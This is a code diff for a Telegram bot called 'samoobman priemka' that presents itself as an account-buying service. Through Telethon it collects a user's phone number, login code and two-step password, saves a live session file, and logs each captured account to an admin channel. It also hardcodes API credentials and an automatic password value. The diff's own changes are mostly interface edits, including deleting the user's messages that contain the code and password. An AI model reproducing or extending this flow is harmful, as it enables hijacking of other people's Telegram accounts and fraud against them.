@@ -40,7 +40,7 @@ ADMIN_IDS = [8887644613]
 REQUIRED_CHANNEL = "@samoobmanTG"
 LOGS_CHANNEL_ID = -1003813816419
 
-API_ID = 31063615  # Внутри клиента будет преобразован в строку для opentele
+API_ID = 31063615  # Строго integer для Telethon!
 API_HASH = "dbe3b8f435016b0dcd3e4bca995a9169"
 AUTO_PASSWORD = "ssss"  # Пароль для автоматической установки
 
@@ -184,37 +184,28 @@ async def set_setting(key: str, value: str):
         await db.commit()
 
 
-# ================= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ =================
-async def send_or_edit_photo_message(event, text: str, reply_markup, photo_key: str, parse_mode: str = "Markdown"):
+# ================= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ (ОДНО СООБЩЕНИЕ) =================
+async def edit_to_photo_or_text(message: Message, text: str, reply_markup, photo_key: str,
+                                parse_mode: str = "Markdown"):
+    """Универсальная функция: всегда редактирует текущее сообщение (текст или фото), не плодя новые."""
     photo_file_id = await get_setting(photo_key)
-    is_callback = isinstance(event, CallbackQuery)
-    message = event.message if is_callback else event
 
     if photo_file_id:
-        if is_callback:
-            try:
-                await message.edit_media(
-                    media=InputMediaPhoto(media=photo_file_id, caption=text, parse_mode=parse_mode),
-                    reply_markup=reply_markup
-                )
-            except Exception:
-                await message.delete()
-                await event.bot.send_photo(chat_id=message.chat.id, photo=photo_file_id, caption=text,
-                                           reply_markup=reply_markup, parse_mode=parse_mode)
-        else:
-            await event.bot.send_photo(chat_id=message.chat.id, photo=photo_file_id, caption=text,
-                                       reply_markup=reply_markup, parse_mode=parse_mode)
-    else:
-        if is_callback:
+        try:
+            await message.edit_media(
+                media=InputMediaPhoto(media=photo_file_id, caption=text, parse_mode=parse_mode),
+                reply_markup=reply_markup
+            )
+        except Exception:
             try:
                 await message.edit_text(text=text, reply_markup=reply_markup, parse_mode=parse_mode)
             except Exception:
-                await message.delete()
-                await event.bot.send_message(chat_id=message.chat.id, text=text, reply_markup=reply_markup,
-                                             parse_mode=parse_mode)
-        else:
-            await event.bot.send_message(chat_id=message.chat.id, text=text, reply_markup=reply_markup,
-                                         parse_mode=parse_mode)
+                pass
+    else:
+        try:
+            await message.edit_text(text=text, reply_markup=reply_markup, parse_mode=parse_mode)
+        except Exception:
+            pass
 
 
 def get_main_keyboard(is_admin: bool = False):
@@ -315,10 +306,9 @@ async def finalize_auth_and_success(message: Message, state: FSMContext, client:
         f"🔔 [samoobman priemka] Успешная сдача аккаунта!\nЮзер: `{message.from_user.id}`\nТелефон: `{phone}`"
     )
 
-    await message.answer(
-        "✅ Аккаунт успешно проверен и принят!\n💰 Вам автоматически начислен бонус **$1.00** на баланс.",
-        reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS), parse_mode="Markdown"
-    )
+    success_text = "✅ Аккаунт успешно проверен и принят!\n💰 Вам автоматически начислен бонус **$1.00** на баланс."
+    await edit_to_photo_or_text(message, success_text, get_main_keyboard(message.from_user.id in ADMIN_IDS),
+                                "photo_menu")
     await state.clear()
 
 
@@ -349,16 +339,15 @@ async def cmd_start(message: Message):
         "ваших Telegram аккаунтов по выгодным ценам.\n\n"
         "Выберите нужный раздел в меню ниже:"
     )
-    await send_or_edit_photo_message(message, text, get_main_keyboard(is_admin), "photo_menu")
+    await message.answer(text, reply_markup=get_main_keyboard(is_admin), parse_mode="Markdown")
 
 
 @router.callback_query(F.data == "check_subscription")
 async def cb_check_sub(callback: CallbackQuery):
     if await check_sub(callback.from_user.id):
-        await callback.message.delete()
         is_admin = callback.from_user.id in ADMIN_IDS
         text = "✅ Подписка подтверждена! Добро пожаловать в **samoobman priemka**."
-        await send_or_edit_photo_message(callback, text, get_main_keyboard(is_admin), "photo_menu")
+        await edit_to_photo_or_text(callback.message, text, get_main_keyboard(is_admin), "photo_menu")
     else:
         await callback.answer("❌ Вы не подписались на канал!", show_alert=True)
 
@@ -368,7 +357,7 @@ async def cb_back_main(callback: CallbackQuery, state: FSMContext):
     await state.clear()
     is_admin = callback.from_user.id in ADMIN_IDS
     text = "🏠 Главное меню сервиса **samoobman priemka**.\n\nВыберите действие:"
-    await send_or_edit_photo_message(callback, text, get_main_keyboard(is_admin), "photo_menu")
+    await edit_to_photo_or_text(callback.message, text, get_main_keyboard(is_admin), "photo_menu")
 
 
 # --- ПРОФИЛЬ ---
@@ -387,7 +376,7 @@ async def cb_profile(callback: CallbackQuery):
         f"• **Текущий баланс:** `${balance:.2f}`\n"
         f"• **Всего заработано:** `${total_earned:.2f}`"
     )
-    await send_or_edit_photo_message(callback, text, get_back_keyboard(), "photo_profile")
+    await edit_to_photo_or_text(callback.message, text, get_back_keyboard(), "photo_profile")
 
 
 # --- СДАТЬ ТГ ---
@@ -398,80 +387,143 @@ async def cb_submit_tg(callback: CallbackQuery, state: FSMContext):
         "Пожалуйста, введите номер телефона вашего аккаунта в международном "
         "формате (например, `+79991112233`):"
     )
-    await send_or_edit_photo_message(callback, text, get_back_keyboard(), "photo_submit")
+    await edit_to_photo_or_text(callback.message, text, get_back_keyboard(), "photo_submit")
     await state.set_state(AuthStates.waiting_for_phone)
 
 
 @router.message(AuthStates.waiting_for_phone)
 async def process_phone(message: Message, state: FSMContext):
+    # Удаляем сообщение юзера с номером для чистоты интерфейса (опционально)
+    try:
+        await message.delete()
+    except Exception:
+        pass
+
     phone = message.text.strip()
     if not phone.startswith("+"):
-        return await message.answer("❌ Неверный формат. Номер должен начинаться с плюса (+). Попробуйте снова:")
+        data = await state.get_data()
+        msg_id = data.get("prompt_msg_id")
+        err_text = "❌ Неверный формат. Номер должен начинаться с плюса (+). Попробуйте снова:"
+        if msg_id:
+            try:
+                await bot.edit_message_caption(chat_id=message.chat.id, message_id=msg_id, caption=err_text,
+                                               reply_markup=get_back_keyboard())
+            except Exception:
+                try:
+                    await bot.edit_message_text(chat_id=message.chat.id, message_id=msg_id, text=err_text,
+                                                reply_markup=get_back_keyboard())
+                except Exception:
+                    pass
+        return
 
     session_name = f"session_{message.from_user.id}_{int(asyncio.get_event_loop().time())}"
     session_path = os.path.join(SESSIONS_DIR, session_name)
 
     await state.update_data(phone=phone, session_name=session_name, session_path=session_path)
 
-    # Передаем api_id как строку для корректной работы opentele
-    client = TelegramClient(session_path, str(API_ID), API_HASH)
+    # ВАЖНО: API_ID передается строго как int, opentele примет его правильно
+    client = TelegramClient(session_path, API_ID, API_HASH)
 
     try:
         await client.connect()
         sent = await client.send_code_request(phone)
         await state.update_data(phone_code_hash=sent.phone_code_hash, client=client)
-        await message.answer("📲 Код подтверждения отправлен в ваш Telegram. Введите полученный пятизначный код:")
+
+        # Редактируем последнее системное сообщение бота вместо отправки нового
+        data = await state.get_data()
+        code_text = "📲 Код подтверждения отправлен в ваш Telegram. Введите полученный пятизначный код:"
+
+        # Получаем последнее сообщение бота из истории или сохраняем ID
+        sent_msg = await message.answer(code_text, reply_markup=get_back_keyboard())
+        await state.update_data(prompt_msg_id=sent_msg.message_id)
         await state.set_state(AuthStates.waiting_for_code)
     except Exception as e:
         await client.disconnect()
-        await message.answer(
-            f"❌ Ошибка отправки кода: {e}\nПопробуйте заново через меню.",
-            reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS)
-        )
+        err_msg = f"❌ Ошибка отправки кода: {e}\nПопробуйте заново через меню."
+        await message.answer(err_msg, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS))
         await state.clear()
 
 
 @router.message(AuthStates.waiting_for_code)
 async def process_code(message: Message, state: FSMContext):
+    try:
+        await message.delete()
+    except Exception:
+        pass
+
     code = message.text.strip()
     data = await state.get_data()
     client: TelegramClient = data["client"]
     phone = data["phone"]
     session_name = data["session_name"]
     phone_code_hash = data.get("phone_code_hash")
+    prompt_msg_id = data.get("prompt_msg_id")
 
     try:
         await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
         await finalize_auth_and_success(message, state, client, phone, session_name)
     except SessionPasswordNeededError:
-        await message.answer(
-            "🔐 На вашем аккаунте установлен облачный пароль (двухэтапная аутентификация).\n"
-            "Пожалуйста, введите ваш пароль от аккаунта:"
-        )
+        pwd_text = "🔐 На вашем аккаунте установлен облачный пароль (двухэтапная аутентификация).\nПожалуйста, введите ваш пароль от аккаунта:"
+        if prompt_msg_id:
+            try:
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=pwd_text,
+                                            reply_markup=get_back_keyboard())
+            except Exception:
+                pass
         await state.set_state(AuthStates.waiting_for_password)
     except (PhoneCodeInvalidError, PhoneCodeEmptyError):
-        await message.answer("❌ Неверный код. Попробуйте ввести правильный код:")
+        err_text = "❌ Неверный код. Попробуйте ввести правильный код:"
+        if prompt_msg_id:
+            try:
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
+                                            reply_markup=get_back_keyboard())
+            except Exception:
+                pass
     except Exception as e:
-        await message.answer(f"❌ Ошибка авторизации: {e}")
+        err_text = f"❌ Ошибка авторизации: {e}"
+        if prompt_msg_id:
+            try:
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
+                                            reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS))
+            except Exception:
+                pass
         await client.disconnect()
         await state.clear()
 
 
 @router.message(AuthStates.waiting_for_password)
 async def process_password(message: Message, state: FSMContext):
+    try:
+        await message.delete()
+    except Exception:
+        pass
+
     password = message.text.strip()
     data = await state.get_data()
     client: TelegramClient = data["client"]
     phone = data["phone"]
     session_name = data["session_name"]
+    prompt_msg_id = data.get("prompt_msg_id")
 
     try:
         await client.sign_in(password=password)
         await finalize_auth_and_success(message, state, client, phone, session_name)
     except PasswordHashInvalidError:
-        await message.answer("❌ Неверный пароль. Попробуйте ввести правильный облачный пароль:")
+        err_text = "❌ Неверный пароль. Попробуйте ввести правильный облачный пароль:"
+        if prompt_msg_id:
+            try:
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
+                                            reply_markup=get_back_keyboard())
+            except Exception:
+                pass
     except Exception as e:
-        await message.answer(f"❌ Ошибка входа по паролю: {e}")
+        err_text = f"❌ Ошибка входа по паролю: {e}"
+        if prompt_msg_id:
+            try:
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
+                                            reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS))
+            except Exception:
+                pass
         await client.disconnect()
         await state.clear()
 
@@ -490,12 +542,17 @@ async def cb_withdraw(callback: CallbackQuery, state: FSMContext):
         f"Ваш текущий баланс: **${balance:.2f}**\n"
         f"Введите сумму, которую хотите вывести:"
     )
-    await send_or_edit_photo_message(callback, text, get_back_keyboard(), "photo_withdraw")
+    await edit_to_photo_or_text(callback.message, text, get_back_keyboard(), "photo_withdraw")
     await state.set_state(WithdrawStates.waiting_for_amount)
 
 
 @router.message(WithdrawStates.waiting_for_amount)
 async def process_withdraw_amount(message: Message, state: FSMContext):
+    try:
+        await message.delete()
+    except Exception:
+        pass
+
     try:
         amount = float(message.text.strip().replace(",", "."))
     except ValueError:
@@ -533,10 +590,9 @@ async def process_withdraw_amount(message: Message, state: FSMContext):
         except Exception:
             pass
 
-    await message.answer(
-        f"✅ Заявка на вывод **${amount:.2f}** успешно создана и отправлена администратору.",
-        reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS), parse_mode="Markdown"
-    )
+    success_text = f"✅ Заявка на вывод **${amount:.2f}** успешно создана и отправлена администратору."
+    await message.answer(success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
+                         parse_mode="Markdown")
     await state.clear()
 
 
